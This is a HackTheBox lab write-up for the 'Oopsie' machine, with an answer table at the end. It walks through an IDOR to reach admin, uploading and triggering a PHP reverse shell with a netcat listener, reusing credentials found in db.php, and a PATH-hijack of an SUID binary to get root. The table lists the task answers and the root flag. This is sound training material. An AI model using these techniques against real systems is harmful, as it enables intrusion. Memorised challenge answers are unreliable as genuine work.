TITLE: Oopsie
CATEGORY: HackTheBox
DATE: 2026-05-07
IMAGE: ./assets/Oopsie.png
---

# Oopsie

Oopsie is a machine that demonstrates IDOR (Insecure Direct Object Reference) to gain administrative access and a path-based SUID privilege escalation.

## Recon

Nmap reveals port 80 (HTTP) and 22 (SSH).

```bash
nmap -sC -sV 10.129.142.167
```

| Port | Service | Version |
| :--- | :--- | :--- |
| 22 | SSH | OpenSSH 7.6p1 |
| 80 | HTTP | Apache httpd 2.4.29 |

Navigating to the website, we find a login page at `/cdn-cgi/login`.

## Exploitation

### IDOR

Logging in as `guest` and checking the account page, we see the URL contains an ID: `?id=2`. By testing other IDs, we find that `id=34322` corresponds to the `admin` user.

From the admin's account page, we obtain the admin's `access_id` and use it to access the "Uploads" section of the site.

### Reverse Shell

We upload a PHP reverse shell. Once uploaded, we trigger it by visiting its location (found by enumerating the uploads directory).

```bash
nc -lvnp 4444
```

### Privilege Escalation

After gaining a shell as the `www-data` user, we find credentials in `/var/www/html/cdn-cgi/login/db.php`:
- **User**: `robert`
- **Password**: `M3G4C0RP123`

We use these credentials to SSH into the machine as `robert`.

Next, we find an SUID binary called `bugtracker`. Running `strings` on it shows it calls `cat` without an absolute path.

```bash
robert@oopsie:~$ strings /usr/bin/bugtracker
...
cat /root/reports/
...
```

We exploit this by creating a malicious `cat` in `/tmp` and adding `/tmp` to our `PATH`.

```bash
echo "/bin/sh" > /tmp/cat
chmod +x /tmp/cat
export PATH=/tmp:$PATH
bugtracker
```

Executing `bugtracker` now gives us a root shell.

## Tasks

| Task | Question | Answer |
| :--- | :--- | :--- |
| 1 | With what tool can we intercept web traffic to see where the login portal for the site is being redirected? | `Burp Suite` |
| 2 | What is the name of the folder where the user is redirected to upon a successful login as guest? | `/cdn-cgi/login` |
| 3 | What is the 5-digit ID found for the admin user? | `34322` |
| 4 | What is its account access ID? | `8832` |
| 5 | What is the name of the page where you can upload the reverse shell? | `uploads.php` |
| 6 | What is the name of the file that contains the login credentials for the database? | `db.php` |
| 7 | What is the password of the user robert? | `M3G4C0RP123` |
| 8 | What can we use to check the SUID binaries on a machine? | `find / -perm -4000 2>/dev/null` |
| 9 | Submit root flag | `f2c745db3905f5331401da96a9355606` |
